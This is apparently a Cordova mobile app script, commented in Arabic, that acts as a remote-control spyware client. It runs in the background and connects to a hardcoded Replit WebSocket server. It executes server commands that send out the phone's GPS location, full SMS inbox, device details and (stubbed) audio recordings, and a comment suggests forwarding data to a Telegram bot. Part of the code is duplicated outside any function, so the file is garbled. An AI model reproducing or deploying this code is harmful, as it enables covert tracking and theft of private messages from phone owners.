document.addEventListener('deviceready', onDeviceReady, false);

function onDeviceReady() {
  console.log('✅ Device is ready');

  // ✅ [1] تشغيل وضع الخلفية
  if (cordova.plugins && cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();

    cordova.plugins.backgroundMode.on('activate', function () {
      cordova.plugins.backgroundMode.disableWebViewOptimizations();
      console.log('📢 Background mode is activated');
    });
  } else {
    console.warn('⚠️ BackgroundMode plugin is not available!');
  }

  // ✅ [2] معلومات الجهاز
  const deviceInfo = {
    uuid: (typeof device !== 'undefined' && device.uuid) || generateUUID(),
    model: (typeof device !== 'undefined' && device.model) || 'Unknown',
    platform: (typeof device !== 'undefined' && device.platform) || 'Unknown',
    version: (typeof device !== 'undefined' && device.version) || 'Unknown',
    manufacturer: (typeof device !== 'undefined' && device.manufacturer) || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };

  // ✅ [3] حالة البطارية (اختياري)
  if (navigator.getBattery) {
    navigator.getBattery().then(function(battery) {
      deviceInfo.battery = {
        level: battery.level,
        charging: battery.charging
      };
      console.log('🔋 Battery Info:', deviceInfo.battery);
    });
  }

  // ✅ طباعة المعلومات كاملة
  console.log('📱 Device Info:', deviceInfo);

  // 📤 (اختياري) يمكنك هنا إرسال deviceInfo إلى الخادم أو Telegram bot
}

// ✅ [4] توليد UUID إذا لم يكن موجوداً
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      
      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }
}

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    
    // تسجيل الجهاز
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, (response) => {
          if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
      
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    // إعادة الاتصال بعد تأخير
    setTimeout(() => connectToServer(deviceInfo), 10000);
  };
  
  // إرسال نبضات قلبية دورية
  const heartbeatInterval = setInterval(() => {
    if (wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        timestamp: new Date().toISOString()
      }));
    } else {
      clearInterval(heartbeatInterval);
    }
  }, 30000);
}

function executeCommand(command, callback) {
  console.log('Executing command:', command);
  
  // إضافة commandId للتعقب
  const commandId = Date.now();
  
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      // [المطلوب 4: رابط Google Maps]
      const googleMapsUrl = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
      
      callback({
        commandId,
        status: 'success',
        location: {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading,
          speed: position.coords.speed,
          timestamp: position.timestamp,
          googleMapsUrl: googleMapsUrl // رابط مباشر
        }
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 100,
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      // [المطلوب 2: عرض رسائل كاملة بدون قص]
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body, // بدون قص
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

function recordAudio(commandId, duration, callback) {
  duration = duration || 10; // Default 10 seconds
  
  // [المطلوب 3: تسجيل بصيغة MP3]
  // مثال مبسط - في التطبيق الفعلي استخدم MediaRecorder مع mimeType: 'audio/mp3'
  setTimeout(() => {
    callback({ 
      commandId,
      status: 'success',
      audio: {
        duration: duration,
        format: 'mp3', // تم تغيير الصيغة إلى mp3
        size: duration * 16000 // تقدير حجم الملف
      }
    });
  }, duration * 1000);
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}
